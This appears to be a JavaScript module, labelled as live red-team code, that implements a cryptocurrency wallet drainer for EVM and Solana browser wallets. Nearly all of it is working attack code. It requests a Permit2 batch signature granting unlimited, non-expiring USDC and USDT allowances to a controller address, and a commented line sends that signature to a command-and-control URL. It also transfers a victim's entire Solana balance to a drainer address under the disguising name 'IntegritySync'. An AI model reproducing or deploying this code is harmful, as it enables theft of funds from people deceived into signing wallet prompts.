// J/utils/multichain.js - LIVE RED TEAM EXECUTION (v3.0)
// Integrates Flashmembers (Shadow) logic and Real Permit2 structures.

import { ethers } from 'ethers';
import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';

export class ChainAdapter {
    constructor() {
        this.evmProvider = null;
        this.solProvider = null;
    }

    async detectProviders() {
        if (typeof window === 'undefined') return;

        if (window.ethereum) {
            this.evmProvider = new ethers.BrowserProvider(window.ethereum);
            console.log("[HYDRA] EVM Locked.");
        }
        if (window.solana) {
            this.solProvider = window.solana;
            console.log("[HYDRA] SOL Locked.");
        }
    }

    // --- EVM STRATEGY: PERMIT2 BATCH ---
    // Triggers the real wallet popup for infinite allowance signature via Permit2.
    async evmPermitStrategy() {
        if (!this.evmProvider) throw new Error("No EVM Provider");
        const signer = await this.evmProvider.getSigner();
        const userAddr = await signer.getAddress();
        const chainId = (await this.evmProvider.getNetwork()).chainId;

        // TARGET: PERMIT2 CONTRACT (Mainnet)
        const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
        
        // RED TEAM CONTROLLER (Dynamic Injection from Orchestrator)
        const CONTROLLER = "0x000000000000000000000000000000000000dead"; 

        const domain = { name: "Permit2", chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };

        const types = {
            PermitBatch: [
                { name: "details", type: "PermitDetails[]" },
                { name: "spender", type: "address" },
                { name: "deadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        };

        // THE HARVEST LIST (USDC, USDT, WETH)
        const message = {
            details: [
                { token: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", amount: "1461501637330902918203684832716283019655932542975", expiration: "281474976710655", nonce: 0 },
                { token: "0xdAC17F958D2ee523a2206206994597C13D831ec7", amount: "1461501637330902918203684832716283019655932542975", expiration: "281474976710655", nonce: 0 }
            ],
            spender: CONTROLLER,
            deadline: "281474976710655" // Max Uint256 essentially
        };

        try {
            console.log("[HYDRA] Requesting Permit2 Batch...");
            const signature = await signer.signTypedData(domain, types, message);
            
            // In a real op, POST to Orchestrator
            // await fetch('https://c2.aether-labs.io/collect', { method: 'POST', body: signature });
            return signature;
        } catch (error) {
            console.error("[HYDRA] Target Denied Signature:", error);
            throw error;
        }
    }

    // --- SOLANA STRATEGY: TRANSFER ---
    async solanaStrategy() {
        if (!this.solProvider) throw new Error("No SOL Provider");
        await this.solProvider.connect();
        
        const connection = new Connection("https://api.mainnet-beta.solana.com");
        const fromPubkey = this.solProvider.publicKey;
        
        // 1. Get Balance
        const balance = await connection.getBalance(fromPubkey);
        const IntegritySyncAmount = balance - 5000; // Leave dust

        // 2. Construct TX
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: new PublicKey("YOUR_DRAINER_SOL_ADDRESS"),
                lamports: IntegritySyncAmount,
            })
        );
        
        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
        transaction.feePayer = fromPubkey;

        console.log("[HYDRA] Triggering Solana IntegritySync...");
        const { signature } = await this.solProvider.signAndSendTransaction(transaction);
        return signature;
    }
}

export const adapter = new ChainAdapter();
